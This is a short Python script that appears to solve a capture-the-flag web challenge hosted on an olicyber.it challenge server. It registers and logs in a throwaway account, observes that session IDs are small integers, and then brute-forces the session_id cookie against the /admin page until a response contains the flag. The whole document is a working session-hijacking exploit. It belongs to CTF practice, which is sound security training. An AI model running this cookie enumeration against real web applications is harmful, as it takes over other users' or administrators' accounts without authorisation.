import requests
site = "http://too-small-reminder.challs.olicyber.it"
s = requests.Session()
header = {'Content-Type': 'application/json'}
r = s.post(f"{site}/register", headers=header, data='{"username":"sas123", "password":"sas123"}')
r1 = s.post(f"{site}/login", headers=header, data='{"username":"sas123", "password":"sas123"}')
print(r.text)
print(r1.cookies.get_dict()) # printa dizionario del tipo {'session_id':'0'}
for i in range(int(10e8)):
    r = requests.get(f"{site}/admin", cookies={"session_id":f"{i}"})
    if "flag" in r.text.lower():
        print(r.text)
        break
    else:
        print(r.text.replace("\n", ""))
